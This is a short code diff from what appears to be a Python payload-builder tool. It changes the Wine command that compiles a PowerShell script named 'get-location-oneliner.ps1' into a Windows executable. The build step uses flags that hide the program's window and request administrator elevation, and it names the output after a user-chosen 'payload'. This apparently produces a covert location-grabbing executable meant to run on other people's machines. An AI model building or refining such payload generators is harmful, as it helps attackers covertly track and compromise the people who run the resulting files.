@@ -88,7 +88,7 @@ def compile():
     elif cmp == 'x86':
         payload = input(" [+] Payload name without extension: ")
         print(GREEN + " [+] Compiling to exe" + DEFAULT)
-        system("wine64 Ps1_To_Exe.exe /ps1 get-location-oneliner.ps1 /exe location.exe /invisible /uac-admin")
+        system("wine Ps1_To_Exe.exe /ps1 get-location-oneliner.ps1 /exe location.exe /invisible /uac-admin")
         rename("location.exe", payload + ".exe")
         print(CYAN + " [+] Output file " + payload + ".exe" + " generated" + DEFAULT)
     else:
